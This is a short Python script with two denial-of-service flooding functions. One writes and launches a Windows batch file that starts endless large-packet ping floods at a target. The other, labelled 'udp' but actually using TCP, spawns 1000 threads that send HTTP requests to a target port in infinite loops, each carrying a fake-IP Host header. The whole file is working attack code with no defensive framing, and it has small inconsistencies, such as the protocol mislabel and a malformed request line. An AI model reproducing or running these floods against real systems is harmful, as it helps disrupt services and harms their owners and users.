import subprocess
import threading
import socket
import os

def icmp(target, size):
    ip = str(target)
    oct = size
    file_path = os.path.dirname(os.path.realpath(__file__))
    bat = open(file_path+"\\"+"letsping.bat",'w+')
    bat.write('@echo off \n')
    bat.write('color '+ str(6) +' \n')
    for i in range(3):
        bat.write('start ping -t -l '+ size + ' ' + ip + '\n')
    bat.close()
    subprocess.call(file_path+"\letsping.bat")

def udp(target, port, fake_ip):
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
    for i in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()
